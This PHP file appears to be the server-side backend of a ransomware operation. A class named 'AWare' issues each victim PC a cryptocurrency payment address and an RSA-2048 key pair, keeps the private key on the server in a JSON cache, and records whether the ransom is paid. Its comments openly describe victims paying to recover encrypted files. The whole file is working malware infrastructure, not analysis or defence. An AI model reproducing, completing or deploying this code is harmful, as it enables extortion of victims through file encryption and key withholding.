<?php

use phpseclib3\Crypt\RSA;

class AWare
{
    private $CryptAPIObject;

    private $CachePath;

    public function __construct($CryptAPIObject)
    {
        $this->CryptAPIObject = $CryptAPIObject;
    }

    public function DefineJsonCachePaths($LogsCacheFile)
    {
        $this->CachePath = $LogsCacheFile;
    }

    public function GetRansomInformationVictim($PC_IDENTIFIER)
    {
        $this->GenerateFileAndDirectoryInCaseDoesNotExist($this->CachePath);

        $JsonArrayData = $this->ReadJsonFile($this->CachePath);

        # In the event that the user's HWID already exists in the Cache, it will return the index of its position
        $ArraySearch = array_search($PC_IDENTIFIER, array_column(
            # If the cache is empty it will not have any array, so here it will give an exception;
            # This is so that no exception is given and a default array is taken
            empty($JsonArrayData) 
                ? [] 
                : $JsonArrayData, 'PC_IDENTIFIER'));

        # The cache already exists
        if (is_int($ArraySearch))
        {
            $RansomInformationVictim = $this->GetVictimInformationFromCache($ArraySearch, $JsonArrayData);

            unset($RansomInformationVictim['privateKey']);

            return $RansomInformationVictim;
        }

        # Here create the address where the victim must pay
        $AddressIn = $this->CryptAPIObject->GenerateAddress('https://' . Domain . '/AWare_API.php');

        # Public/private key with which the victim's files will be encrypted 
        # PS. The private key will be kept on the server
        $EncryptionPairKeys = $this->CreatePairEncryptionKeys();

        $UserCacheInformation = [
            [
                'PC_IDENTIFIER' => $PC_IDENTIFIER,
                'privateKey' => $EncryptionPairKeys['privateKey'],
                'publicKey' => $EncryptionPairKeys['publicKey'],
                'AddressIn' => $AddressIn,
                'RansomPaid' => false
            ]
        ];

        $Cache = array_merge(empty($JsonArrayData) ? [] : $JsonArrayData, $UserCacheInformation);

        $this->CreateJsonFile($this->CachePath, $Cache);

        unset($UserCacheInformation[0]['privateKey']);
        
        return $UserCacheInformation[0];
    }

    private function GetVictimInformationFromCache($Index, $Array)
    {
        return $Array[$Index];
    }

    private function CreatePairEncryptionKeys()
    {
        $privateKey = RSA::createKey(2048);
        $publicKey = $privateKey->getPublicKey();
         
        return [
            'privateKey' => $privateKey->toString('PKCS8'),
            'publicKey' => $publicKey->toString('PKCS8')
        ];
    }

    private function GenerateFileAndDirectoryInCaseDoesNotExist($File)
    {
        # If the file already exists
        if (file_exists($File))
        {
            # it returns
            return;
        }

        # If the file does not contain the '/' sign
        if (!str_contains($File, '/'))
        {
            # A empty .json file is saved directly to the path
            $this->CreateJsonFile($File, []);
            return;
        }

        # If it is a directory, here it will do a split with the /
        $PathSplitted = explode('/', $File);

        # If the directory does not exist
        if (!file_exists($PathSplitted[0]))
        {
            # The directory will be created
            mkdir($PathSplitted[0], 0777, true);
        }

        # The new path will be saved (directory / name of the .json file)
        $File = $PathSplitted[0] . '/' . $PathSplitted[1];

        # The file will be created
        $this->CreateJsonFile($File, []);
    }

    private function CreateJsonFile($Path, $Array)
    {
        file_put_contents($Path, json_encode($Array, JSON_PRETTY_PRINT));
    }

    private function ReadJsonFile($Path)
    {
        if (!file_exists($Path))
        {
            throw new Exception('Unfound .json file : ' . $Path);
        }

        return json_decode(file_get_contents($Path), true);
    }
}